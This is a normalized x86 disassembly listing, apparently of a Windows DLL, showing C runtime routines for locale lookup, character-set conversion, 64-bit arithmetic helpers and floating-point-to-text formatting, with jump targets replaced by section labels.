lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_1001b0fc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_1000d5dd
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c0a5
leave
retn
sub_1001b145
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c0a5
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_1000fe10
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_10018797
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_1000cfb2
pop ecx
cmp eax edi
je r-xdata
call sub_1001b300
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_10014440
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_10015ac2
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_1000ced5
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_1001b330
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1001b35d
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1000d1a7
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10015db3
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1001942d
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
sub_1001b405
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1000d1a7
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10015db3
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10019971
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
sub_1001b4ad
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_1000ecdb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_10014440
inc eax
push eax
push edi
push esi
call sub_1000cb70
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_1001b56c
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_1001b629
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1001b56c
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1001b869
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_100143d1
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000d7be
add esp 0x14
sub_1001b6c0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1001b7a0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1001b7bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_1001c2bb
call sub_1001c2bb
mov [ esi ] eax
jmp r-xdata
call sub_1000ecdb
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1000d8e6
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_1001c2bb
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_1001b82b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001b869
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_100143d1
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_1000d7be
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000d7be
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_100143d1
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
